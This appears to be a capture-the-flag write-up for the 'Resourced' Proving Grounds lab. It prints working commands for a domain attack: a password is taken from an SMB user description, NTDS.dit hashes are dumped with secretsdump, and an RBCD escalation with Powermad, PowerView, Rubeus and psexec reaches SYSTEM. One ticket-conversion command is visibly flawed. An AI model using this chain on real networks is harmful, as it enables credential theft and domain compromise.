---
layout: post
title: "Resourced - Proving Grounds Practice"
summary: "SMB Null Session with no username and password → rpcclint querydispinfo or enum4linux to read user descriptions → Password Audit share → Mount SMB Share → Dump hashes with ntds.dit, SYSTEM and SECURITY using impacket-secretsdump → brute force with nxc to find correct username:hash combination → User Shell → GenericAll Privileges over DC → Resource Based Constrained Delegation (RBCD) → Administrator TGS → SYSTEM Shell via psexec"
---

# Resourced - Proving Grounds Practice

## Enumeration
### Nmap 
Initial Nmap scan revealed SMB and some common Active Directory ports were open.

<img width="1523" height="873" alt="00 - nmap" src="https://github.com/user-attachments/assets/e235ce3b-7def-461e-8ba5-133426648d66" />

### SMB Enumeration
I could not find SMB Null session with `nxc`. However, `enum4linux <IP> -a` and `rpclient -U '' -N <IP>` helped me to access SMB informations available on target machine.

When you run the `querydispinfo` command inside rpcclient (or when enum4linux does this automatically), it triggers a specific RPC (Remote Procedure Call) to Windows in the background: `SamrQueryDisplayInfo`

This function effectively tells Windows: 'Give me the list of users, but don't just provide the names; also provide the details at the Display Information level (which includes descriptions/comments).'

And running `enum4linux` or `querydispinfo` command on `rpcclient` revealed a description field with password.

<img width="1438" height="325" alt="01 - rpcclient" src="https://github.com/user-attachments/assets/7c0cb6ca-7be0-4935-8cb3-24218d115352" />

<img width="1438" height="344" alt="02 - enum4linux" src="https://github.com/user-attachments/assets/47d71590-5afb-41fb-ab6b-2e7eb119427f" />


## Exploitation
The password was correct, we could authenticate both smb and ldap.

<img width="1723" height="319" alt="03 - ldap and smb" src="https://github.com/user-attachments/assets/0507a9fa-a5ed-4ead-989e-6815774532c9" />

So at first I checked SMB Shares and found `Password Audit` share which current user had READ access.

<img width="1788" height="287" alt="04 - password audit" src="https://github.com/user-attachments/assets/4cc48b87-2339-408c-a8d2-6bffb7b96e22" />

It included `NTDS.dit`, `SYSTEM` and `SECURITY` files.

<img width="949" height="442" alt="05 - password audit 2" src="https://github.com/user-attachments/assets/2ab5ebe0-cc8a-4afb-9536-988f79e8e3d1" />

So at first I mounted the share, because I could not transfer the files using smbclient. They were too big to transfer through smbclient.
```bash
sudo mount -t cifs '//192.168.128.175/Password Audit' myShare -osec=ntlmv2,domain=resourced.local,username=V.Ventz,password=HotelCalifornia194!  
```

<img width="1517" height="195" alt="06 - mounted smb share" src="https://github.com/user-attachments/assets/ebb3439b-0090-44af-9cc4-02870c5f504c" />

Then using `impacket-secretsdump`, I simply dumped all available hashes.

<img width="1887" height="752" alt="07 - dumped hashes" src="https://github.com/user-attachments/assets/7b45f94d-5eee-4c77-9dba-7fa189874257" />

Then using `nxc` I brute forced usernames and hashes and found a valid hash for user L.Livingstone 

<img width="1751" height="506" alt="08 - new user" src="https://github.com/user-attachments/assets/92f9c58d-72b7-4c81-a461-15dad08f5800" />

And I simply logged in using `evil-winrm` and obtained user shell.

<img width="1674" height="408" alt="09 - user flag" src="https://github.com/user-attachments/assets/4aae92b5-578d-42c3-ab5b-dd7b164609ad" />

## Privilege Escalation
### Resource Based Contrained Delegation (RBCD)
Then I ran bloodhound-python and found that user had GenericAll privileges over Domain Controller.

<img width="1043" height="337" alt="10 - genericall" src="https://github.com/user-attachments/assets/5c36c3ef-a3c0-4a5b-8b94-186199f93432" />

So I could both apply RBCD steps to impersonate Administrator or I could change DC machine account password and login with it. I decided to apply RBCD steps.

These are the necessary commands and scripts to apply steps:
```powershell
. .\Powermad.ps1
. .\PowerView.ps1
New-MachineAccount -MachineAccount testsystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
$ComputerSid = Get-DomainComputer testsystem -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
Get-DomainComputer ResourceDC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

After these, we could simply use rubeus to obtain a TGS in base64 format. I copied the base64 and saved it on my attacker machine as `kirbi.b64` file.
```powershell
.\Rubeus.exe s4u /user:<fake computer name>  /rc4:<Fake Computer Password Hash> /domain:<Domain> /impersonate:Administrator /msdspn:cifs/<Target Computer> /ptt /nowrap
```

<img width="1889" height="417" alt="11 - rubeus" src="https://github.com/user-attachments/assets/316181d0-e5db-4d2c-a739-0c5859035056" />

Then I converted base64 to first kirbi then ccache files.
```bash
echo kirbi.b64 | base64 -d > ticket.ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
```

<img width="793" height="211" alt="12 - kirbi convert" src="https://github.com/user-attachments/assets/6e817f7d-011e-4dcc-af98-e22191a61e94" />



and logged in using psexec with below command:
```bash
KRB5CCNAME=ticket.ccache impacket-psexec resourced.local/administrator@ResourceDC.resourced.local -k -no-pass
```
<img width="1510" height="638" alt="15 - gg" src="https://github.com/user-attachments/assets/6f47cc7d-b8cb-46dd-a2f9-7c14d6791af7" />

